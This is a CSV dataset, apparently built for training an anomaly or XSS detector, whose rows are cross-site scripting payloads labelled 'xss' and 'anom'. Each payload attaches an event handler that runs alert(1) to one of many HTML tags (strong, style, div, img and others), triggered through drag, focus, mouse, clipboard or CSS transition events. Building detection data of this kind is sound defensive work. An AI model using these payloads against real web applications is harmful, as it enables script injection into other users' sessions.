payload,length,attack_type,label
"<strike onpaste=""alert(1)"" contenteditable>test</strike>",56,xss,anom
"<strong draggable=""true"" ondrag=""alert(1)"">test</strong>",56,xss,anom
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",59,xss,anom
"<strong draggable=""true"" ondragenter=""alert(1)"">test</strong>",61,xss,anom
"<strong draggable=""true"" ondragleave=""alert(1)"">test</strong>",61,xss,anom
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",61,xss,anom
<strong id=x tabindex=1 onactivate=alert(1)></strong>,53,xss,anom
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>,59,xss,anom
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,78,xss,anom
<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>,77,xss,anom
<strong id=x tabindex=1 onfocus=alert(1)></strong>,50,xss,anom
<strong id=x tabindex=1 onfocusin=alert(1)></strong>,52,xss,anom
"<strong onbeforecopy=""alert(1)"" contenteditable>test</strong>",61,xss,anom
"<strong onbeforecut=""alert(1)"" contenteditable>test</strong>",60,xss,anom
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",62,xss,anom
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,66,xss,anom
"<strong onclick=""alert(1)"">test</strong>",40,xss,anom
"<strong oncontextmenu=""alert(1)"">test</strong>",46,xss,anom
"<strong oncopy=""alert(1)"" contenteditable>test</strong>",55,xss,anom
"<strong oncut=""alert(1)"" contenteditable>test</strong>",54,xss,anom
"<strong ondblclick=""alert(1)"">test</strong>",43,xss,anom
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,70,xss,anom
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",58,xss,anom
"<strong onkeypress=""alert(1)"" contenteditable>test</strong>",59,xss,anom
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",56,xss,anom
"<strong onmousedown=""alert(1)"">test</strong>",44,xss,anom
"<strong onmouseenter=""alert(1)"">test</strong>",45,xss,anom
"<strong onmouseleave=""alert(1)"">test</strong>",45,xss,anom
"<strong onmousemove=""alert(1)"">test</strong>",44,xss,anom
"<strong onmouseout=""alert(1)"">test</strong>",43,xss,anom
"<strong onmouseover=""alert(1)"">test</strong>",44,xss,anom
"<strong onmouseup=""alert(1)"">test</strong>",42,xss,anom
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",56,xss,anom
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",54,xss,anom
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",57,xss,anom
"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",59,xss,anom
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",59,xss,anom
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",59,xss,anom
<style id=x tabindex=1 onactivate=alert(1)></style>,51,xss,anom
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,57,xss,anom
<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>,76,xss,anom
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,75,xss,anom
<style id=x tabindex=1 onfocus=alert(1)></style>,48,xss,anom
<style id=x tabindex=1 onfocusin=alert(1)></style>,50,xss,anom
"<style onbeforecopy=""alert(1)"" contenteditable>test</style>",59,xss,anom
"<style onbeforecut=""alert(1)"" contenteditable>test</style>",58,xss,anom
"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",60,xss,anom
<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>,64,xss,anom
"<style onclick=""alert(1)"">test</style>",38,xss,anom
"<style oncontextmenu=""alert(1)"">test</style>",44,xss,anom
"<style oncopy=""alert(1)"" contenteditable>test</style>",53,xss,anom
"<style oncut=""alert(1)"" contenteditable>test</style>",52,xss,anom
"<style ondblclick=""alert(1)"">test</style>",41,xss,anom
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,68,xss,anom
"<style onkeydown=""alert(1)"" contenteditable>test</style>",56,xss,anom
"<style onkeypress=""alert(1)"" contenteditable>test</style>",57,xss,anom
"<style onkeyup=""alert(1)"" contenteditable>test</style>",54,xss,anom
<style onload=alert(1)></style>,31,xss,anom
"<style onmousedown=""alert(1)"">test</style>",42,xss,anom
"<style onmouseenter=""alert(1)"">test</style>",43,xss,anom
"<style onmouseleave=""alert(1)"">test</style>",43,xss,anom
"<style onmousemove=""alert(1)"">test</style>",42,xss,anom
"<style onmouseout=""alert(1)"">test</style>",41,xss,anom
"<style onmouseover=""alert(1)"">test</style>",42,xss,anom
"<style onmouseup=""alert(1)"">test</style>",40,xss,anom
"<style onpaste=""alert(1)"" contenteditable>test</style>",54,xss,anom
<style onreadystatechange=alert(1)></style>,43,xss,anom
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></a>",105,xss,anom
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",111,xss,anom
"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></acronym>",117,xss,anom
"<style>:target {color: red;}</style><address id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></address>",117,xss,anom
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",115,xss,anom
"<style>:target {color: red;}</style><area id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></area>",111,xss,anom
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",117,xss,anom
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></aside>",113,xss,anom
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio>",113,xss,anom
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",105,xss,anom
"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",111,xss,anom
"<style>:target {color: red;}</style><basefont id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></basefont>",119,xss,anom
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdi>",109,xss,anom
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",109,xss,anom
"<style>:target {color: red;}</style><bgsound id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bgsound>",117,xss,anom
"<style>:target {color: red;}</style><big id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></big>",109,xss,anom
"<style>:target {color: red;}</style><blink id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blink>",113,xss,anom
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blockquote>",123,xss,anom
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",111,xss,anom
"<style>:target {color: red;}</style><br id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></br>",107,xss,anom
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",115,xss,anom
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",115,xss,anom
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></caption>",117,xss,anom
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></center>",115,xss,anom
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></cite>",111,xss,anom
"<style>:target {color: red;}</style><code id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></code>",111,xss,anom
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></col>",109,xss,anom
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",119,xss,anom
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></command>",117,xss,anom
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></content>",117,xss,anom
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",111,xss,anom
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></datalist>",119,xss,anom
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",107,xss,anom
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></del>",109,xss,anom
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",117,xss,anom
"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dfn>",109,xss,anom
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dialog>",115,xss,anom
"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dir>",109,xss,anom
"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></div>",109,xss,anom
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dl>",107,xss,anom
"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dt>",107,xss,anom
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",117,xss,anom
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",107,xss,anom
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",113,xss,anom
"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></fieldset>",119,xss,anom
"<style>:target {color: red;}</style><figcaption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figcaption>",123,xss,anom
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figure>",115,xss,anom
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></font>",111,xss,anom
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></footer>",115,xss,anom
"<style>:target {color: red;}</style><form id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></form>",111,xss,anom
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frame>",113,xss,anom
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",119,xss,anom
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",107,xss,anom
"<style>:target {color: red;}</style><head id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></head>",111,xss,anom
"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></header>",115,xss,anom
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",115,xss,anom
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hr>",107,xss,anom
"<style>:target {color: red;}</style><html id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></html>",111,xss,anom
"<style>:target {color: red;}</style><i id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></i>",105,xss,anom
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",115,xss,anom
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",113,xss,anom
"<style>:target {color: red;}</style><img id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></img>",109,xss,anom
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></input>",113,xss,anom
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ins>",109,xss,anom
"<style>:target {color: red;}</style><isindex id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></isindex>",117,xss,anom
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",109,xss,anom
"<style>:target {color: red;}</style><keygen id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></keygen>",115,xss,anom
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",113,xss,anom
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",115,xss,anom
"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></li>",107,xss,anom
"<style>:target {color: red;}</style><link id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></link>",111,xss,anom
"<style>:target {color: red;}</style><listing id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></listing>",117,xss,anom
"<style>:target {color: red;}</style><main id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></main>",111,xss,anom
"<style>:target {color: red;}</style><map id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></map>",109,xss,anom
"<style>:target {color: red;}</style><mark id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></mark>",111,xss,anom
"<style>:target {color: red;}</style><marquee id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></marquee>",117,xss,anom
"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menu>",111,xss,anom
"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>",119,xss,anom
"<style>:target {color: red;}</style><meta id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meta>",111,xss,anom
"<style>:target {color: red;}</style><meter id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meter>",113,xss,anom
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",119,xss,anom
"<style>:target {color: red;}</style><nav id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nav>",109,xss,anom
"<style>:target {color: red;}</style><nextid id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nextid>",115,xss,anom
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",111,xss,anom
"<style>:target {color: red;}</style><noembed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noembed>",117,xss,anom
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",119,xss,anom
"<style>:target {color: red;}</style><noscript id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noscript>",119,xss,anom
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></object>",115,xss,anom
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",107,xss,anom
"<style>:target {color: red;}</style><optgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></optgroup>",119,xss,anom
"<style>:target {color: red;}</style><option id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></option>",115,xss,anom
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",115,xss,anom
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",105,xss,anom
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",113,xss,anom
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>",117,xss,anom
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",121,xss,anom
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",109,xss,anom
"<style>:target {color: red;}</style><progress id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></progress>",119,xss,anom
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",105,xss,anom
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",107,xss,anom
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rp>",107,xss,anom
"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rt>",107,xss,anom
"<style>:target {color: red;}</style><rtc id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rtc>",109,xss,anom
"<style>:target {color: red;}</style><ruby id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ruby>",111,xss,anom
"<style>:target {color: red;}</style><s id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></s>",105,xss,anom
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></samp>",111,xss,anom
"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",115,xss,anom
"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",117,xss,anom
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",115,xss,anom
"<style>:target {color: red;}</style><shadow id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></shadow>",115,xss,anom
"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",111,xss,anom
"<style>:target {color: red;}</style><small id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></small>",113,xss,anom
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></source>",115,xss,anom
"<style>:target {color: red;}</style><spacer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></spacer>",115,xss,anom
"<style>:target {color: red;}</style><span id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></span>",111,xss,anom
"<style>:target {color: red;}</style><strike id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strike>",115,xss,anom
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",115,xss,anom
"<style>:target {color: red;}</style><style id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></style>",113,xss,anom
"<style>:target {color: red;}</style><sub id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sub>",109,xss,anom
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",117,xss,anom
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sup>",109,xss,anom
"<style>:target {color: red;}</style><svg id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></svg>",109,xss,anom
"<style>:target {color: red;}</style><table id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></table>",113,xss,anom
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",113,xss,anom
"<style>:target {color: red;}</style><td id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></td>",107,xss,anom
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></template>",119,xss,anom
"<style>:target {color: red;}</style><textarea id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></textarea>",119,xss,anom
"<style>:target {color: red;}</style><tfoot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tfoot>",113,xss,anom
"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>",107,xss,anom
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></thead>",113,xss,anom
"<style>:target {color: red;}</style><time id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></time>",111,xss,anom
"<style>:target {color: red;}</style><title id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></title>",113,xss,anom
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",107,xss,anom
"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></track>",113,xss,anom
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tt>",107,xss,anom
"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></u>",105,xss,anom
"<style>:target {color: red;}</style><ul id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ul>",107,xss,anom
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",109,xss,anom
"<style>:target {color: red;}</style><video id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></video>",113,xss,anom
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></wbr>",109,xss,anom
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></xmp>",109,xss,anom
"<style>:target {color:red;}</style><a id=x style=""transition:color 1s"" ontransitionend=alert(1)></a>",100,xss,anom
"<style>:target {color:red;}</style><abbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></abbr>",106,xss,anom
"<style>:target {color:red;}</style><acronym id=x style=""transition:color 1s"" ontransitionend=alert(1)></acronym>",112,xss,anom
"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=alert(1)></address>",112,xss,anom
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",110,xss,anom
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>",106,xss,anom
"<style>:target {color:red;}</style><article id=x style=""transition:color 1s"" ontransitionend=alert(1)></article>",112,xss,anom
"<style>:target {color:red;}</style><aside id=x style=""transition:color 1s"" ontransitionend=alert(1)></aside>",108,xss,anom
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",108,xss,anom
"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionend=alert(1)></b>",100,xss,anom
"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",106,xss,anom
"<style>:target {color:red;}</style><basefont id=x style=""transition:color 1s"" ontransitionend=alert(1)></basefont>",114,xss,anom
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdi>",104,xss,anom
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdo>",104,xss,anom
"<style>:target {color:red;}</style><bgsound id=x style=""transition:color 1s"" ontransitionend=alert(1)></bgsound>",112,xss,anom
"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" ontransitionend=alert(1)></big>",104,xss,anom
"<style>:target {color:red;}</style><blink id=x style=""transition:color 1s"" ontransitionend=alert(1)></blink>",108,xss,anom
"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionend=alert(1)></blockquote>",118,xss,anom
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" ontransitionend=alert(1)></body>",106,xss,anom
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" ontransitionend=alert(1)></br>",102,xss,anom
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",110,xss,anom
"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionend=alert(1)></canvas>",110,xss,anom
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",112,xss,anom
"<style>:target {color:red;}</style><center id=x style=""transition:color 1s"" ontransitionend=alert(1)></center>",110,xss,anom
"<style>:target {color:red;}</style><cite id=x style=""transition:color 1s"" ontransitionend=alert(1)></cite>",106,xss,anom
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",106,xss,anom
"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" ontransitionend=alert(1)></col>",104,xss,anom
"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></colgroup>",114,xss,anom
"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionend=alert(1)></command>",112,xss,anom
"<style>:target {color:red;}</style><content id=x style=""transition:color 1s"" ontransitionend=alert(1)></content>",112,xss,anom
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",106,xss,anom
"<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=alert(1)></datalist>",114,xss,anom
"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" ontransitionend=alert(1)></dd>",102,xss,anom
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",104,xss,anom
"<style>:target {color:red;}</style><details id=x style=""transition:color 1s"" ontransitionend=alert(1)></details>",112,xss,anom
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionend=alert(1)></dfn>",104,xss,anom
"<style>:target {color:red;}</style><dialog id=x style=""transition:color 1s"" ontransitionend=alert(1)></dialog>",110,xss,anom
"<style>:target {color:red;}</style><dir id=x style=""transition:color 1s"" ontransitionend=alert(1)></dir>",104,xss,anom
"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=alert(1)></div>",104,xss,anom
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionend=alert(1)></dl>",102,xss,anom
"<style>:target {color:red;}</style><dt id=x style=""transition:color 1s"" ontransitionend=alert(1)></dt>",102,xss,anom
"<style>:target {color:red;}</style><element id=x style=""transition:color 1s"" ontransitionend=alert(1)></element>",112,xss,anom
"<style>:target {color:red;}</style><em id=x style=""transition:color 1s"" ontransitionend=alert(1)></em>",102,xss,anom
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",108,xss,anom
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",114,xss,anom
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" ontransitionend=alert(1)></figcaption>",118,xss,anom
"<style>:target {color:red;}</style><figure id=x style=""transition:color 1s"" ontransitionend=alert(1)></figure>",110,xss,anom
"<style>:target {color:red;}</style><font id=x style=""transition:color 1s"" ontransitionend=alert(1)></font>",106,xss,anom
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" ontransitionend=alert(1)></footer>",110,xss,anom
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionend=alert(1)></form>",106,xss,anom
"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" ontransitionend=alert(1)></frame>",108,xss,anom
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" ontransitionend=alert(1)></frameset>",114,xss,anom
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" ontransitionend=alert(1)></h1>",102,xss,anom
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionend=alert(1)></head>",106,xss,anom
"<style>:target {color:red;}</style><header id=x style=""transition:color 1s"" ontransitionend=alert(1)></header>",110,xss,anom
"<style>:target {color:red;}</style><hgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></hgroup>",110,xss,anom
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" ontransitionend=alert(1)></hr>",102,xss,anom
